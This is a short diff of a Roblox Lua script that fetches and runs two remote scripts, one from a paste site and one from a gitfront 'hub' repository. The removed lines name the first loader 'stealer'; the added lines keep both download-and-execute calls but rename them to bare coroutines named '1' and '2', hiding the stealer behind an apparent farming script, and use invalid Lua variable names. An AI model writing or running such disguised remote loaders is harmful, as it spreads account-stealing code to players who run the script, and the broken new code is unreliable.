@@ -1,10 +1,15 @@
-lua
-local function stealer()
-    loadstring(game:HttpGet("https://pastefy.app/z1DaKfem/raw"))()
-end
-local function farm()
-    loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
-end
+local 1=
+    coroutine.create(
+    function()
+loadstring(game:HttpGet("https://pastefy.app/z1DaKfem/raw"))()
+    end
+)
+local 2=
+    coroutine.create(
+    function()
+loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
+    end
+)
 
-task.spawn(stealer)
-task.spawn(farm) 
+coroutine.resume(2)
+coroutine.resume(1) 
